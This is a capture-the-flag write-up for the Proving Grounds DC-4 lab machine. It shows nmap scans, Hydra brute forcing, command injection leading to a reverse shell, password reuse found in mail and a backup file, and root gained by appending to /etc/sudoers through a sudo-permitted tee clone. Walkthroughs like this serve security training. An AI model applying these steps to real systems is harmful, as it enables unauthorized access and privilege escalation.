# PG Play - DC-4

#### Ip: 192.168.176.195
#### Name: DC-4
#### Difficulty: Intermediate
#### Community Rating: Intermediate

----------------------------------------------------------------------

### Enumeration

I'll kick off enumerating this box with an Nmap scan covering all TCP ports. To speed this along I'll also use the `--min-rate 10000` flag:

```text
┌──(ryan㉿kali)-[~/PG/DC-4]
└─$ sudo nmap -p-  192.168.176.195 --min-rate 10000
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-25 13:11 CDT
Nmap scan report for 192.168.176.195
Host is up (0.065s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 6.96 seconds
```

Lets scan these ports using the `-sV` and `-sC` flags to enumerate versions and to use default Nmap scripts:

```text
┌──(ryan㉿kali)-[~/PG/DC-4]
└─$ sudo nmap -sC -sV 192.168.176.195 -p 22,80            
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-25 13:11 CDT
Nmap scan report for 192.168.176.195
Host is up (0.066s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 8d6057066c27e02f762ce642c001ba25 (RSA)
|   256 e7838cd7bb84f32ee8a25f796f8e1930 (ECDSA)
|_  256 fd39478a5e58339973739e227f904f4b (ED25519)
80/tcp open  http    nginx 1.15.10
|_http-title: System Tools
|_http-server-header: nginx/1.15.10
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.89 seconds
```

Heading over to the site on port 80 we find a basic login screen.

site.png

Taking a look at the page source we can see the form is making a POST request on `/login.php`

Lets use Hydra to try and bruteforce the admin user's password:

brute.png

Nice, Hydra found a password!

Logging into the site we see we can follow a link to `/command.php`,  which in turn lets us select a few different commands we can run against the system:

command.png

list.png

Lets catch this in Burp and see what else we can find:

Interesting, we can see that commands are being executing in the `radio` field (I think these are called radio buttons in HTML)

burp.png

We can confirm we have code execution here by inputing the command `pwd` into the field (which wasn't an option in the GUI) and getting a valid response:

pwd.png

### Exploitation

We can exploit this but issuing a reverse shell command here:

burp2.png

Which gets us a shell back in our NetCat listener:

shell.png

We can then grab the local.txt flag in Jim's directory:

user_flag.png

### Privilege Escalation

Looking around the machine I find a file called `old-passwords.bak`

```text
www-data@dc-4:/home/jim/backups$ cat old-passwords.bak 
000000
12345
iloveyou
1q2w3e4r5t
1234
123456a
qwertyuiop
monkey
123321
dragon
654321
666666
123

<SNIP>
```

Lets copy the list back to our attacking machine and try to bruteforce the passwords for SSH as user Jim:

brute2.png

Cool, that worked:

```text
┌──(ryan㉿kali)-[~/PG/DC-4]
└─$ ssh jim@192.168.176.195       
The authenticity of host '192.168.176.195 (192.168.176.195)' can't be established.
ED25519 key fingerprint is SHA256:0CH/AiSnfSSmNwRAHfnnLhx95MTRyszFXqzT03sUJkk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.176.195' (ED25519) to the list of known hosts.
jim@192.168.176.195's password: 
Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Sun Apr  7 02:23:55 2019 from 192.168.0.100
jim@dc-4:~$ hostname
dc-4
```

Checking out the `/var/mail` directory, we find an interesting file called `jim`:

```text
jim@dc-4:/var/mail$ cat jim
From charles@dc-4 Sat Apr 06 21:15:46 2019
Return-path: <charles@dc-4>
Envelope-to: jim@dc-4
Delivery-date: Sat, 06 Apr 2019 21:15:46 +1000
Received: from charles by dc-4 with local (Exim 4.89)
	(envelope-from <charles@dc-4>)
	id 1hCjIX-0000kO-Qt
	for jim@dc-4; Sat, 06 Apr 2019 21:15:45 +1000
To: jim@dc-4
Subject: Holidays
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <E1hCjIX-0000kO-Qt@dc-4>
From: Charles <charles@dc-4>
Date: Sat, 06 Apr 2019 21:15:45 +1000
Status: O

Hi Jim,

I'm heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.

Password is:  ^xHhA&hvim0y

See ya,
Charles
```
Cool, another credential. Lets `su` over to user charles:

```text
jim@dc-4:/var/mail$ su charles
Password: 
charles@dc-4:/var/mail$ whoami
charles
```

If we run `sudo -l` to see what we can run wiht elevated permissions we find something called teehee:

```text
charles@dc-4:/var/mail$ sudo -l
Matching Defaults entries for charles on dc-4:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User charles may run the following commands on dc-4:
    (root) NOPASSWD: /usr/bin/teehee
```

I'm wondering if this is just `tee` but with a different name?

Lets try adding charles to the sudoers file using `tee`:

```text
charles@dc-4:/var/mail$ echo "charles ALL=(ALL:ALL) ALL" | sudo /usr/bin/teehee /etc/sudoers
charles ALL=(ALL:ALL) ALL 
charles@dc-4:/var/mail$ sudo su root

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for charles: 
root@dc-4:/var/mail# whoami && hostname
root
dc-4
```
Nice, that worked!

All we need to do now is grab the proof.txt flag:

root_flag.png

Thanks for following along!

-Ryan

---------------------------------------------